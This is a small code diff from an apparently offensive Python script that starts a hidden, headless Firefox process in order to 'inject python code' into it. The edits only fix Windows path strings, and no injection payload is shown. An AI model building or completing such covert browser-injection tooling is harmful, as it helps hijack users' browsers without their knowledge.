@@ -72,7 +72,7 @@ else:
             print("Firefox is running. Injecting...")
             #create a new, headless "invisable" firefox thread
             firefox = [
-                'C:\Program Files\Mozilla Firefox\firefox.exe',
+                'C:\\Program Files\\Mozilla Firefox\\firefox.exe',
                 '-headless'
             ]
             firefox_proc = subprocess.Popen(firefox)
@@ -84,7 +84,7 @@ else:
             print("Firefox is not running. Starting firefox")
             #create new firefox process
             url = 'https://www.google.com'
-            firefox_path = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
+            firefox_path = 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'
             firefox = [firefox_path, url]
             firefox_proc = subprocess.Popen(firefox)
             #inject python code into the new process
